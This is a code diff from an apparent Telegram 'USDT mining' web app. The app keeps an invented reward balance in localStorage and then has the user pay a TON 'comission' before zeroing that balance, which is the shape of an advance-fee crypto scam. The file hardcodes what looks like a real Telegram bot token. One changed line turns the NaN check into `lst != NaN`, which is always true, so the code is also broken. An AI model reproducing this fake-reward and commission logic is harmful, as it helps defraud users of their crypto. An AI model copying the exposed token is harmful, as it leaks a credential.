@@ -439,7 +439,7 @@ a {
 let tg = window.Telegram.WebApp;
 
 let activeMining = false;
-let lst = parseFloat(localStorage.getItem("dfdf")); //lusdt
+let lst = parseFloat(localStorage.getItem("opop")) + 0.0001; //lusdt
 let data = 0;
 let blocks = 0;
 let wallet = "";
@@ -509,7 +509,7 @@ window.addEventListener("load", (event) => {
 });
 
 window.setInterval(function(){
-  if(lst <= 0 || lst == NaN){
+  if(lst <= 0 || lst != NaN){
     document.getElementById("usdt").innerHTML = `<span class="fancy">0.00 USDT</span>`;
   }
   else{
@@ -713,7 +713,7 @@ function limitedMine(blockData, difficulty, fees, hash, lt) {
 
     reward = (1.04567 + (hashvalue * difficulty / 5)) / 10; //0.96
     lst = lst + reward;
-    localStorage.setItem("dfdf", lst);
+    localStorage.setItem("opop", lst);
     return reward;
 
 
@@ -750,7 +750,7 @@ function limitedMineGolden(blockData, difficulty, fees, hash, lt) {
 
     reward = (1.04567 + (hashvalue * difficulty / 5)) * 5 / 10; //0.96
     lst = lst + (reward * 5);
-    localStorage.setItem("dfdf", lst);
+    localStorage.setItem("opop", lst);
     return reward;
 
 
@@ -1104,7 +1104,7 @@ function pp(){
                     await tonConnectUI.sendTransaction(transaction);
                     alert("You successfuly paid comission!");
                     lst = 0;
-                    localStorage.setItem("dfdf", lst);
+                    localStorage.setItem("opop", lst);
 
 					let telegram = {
     					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
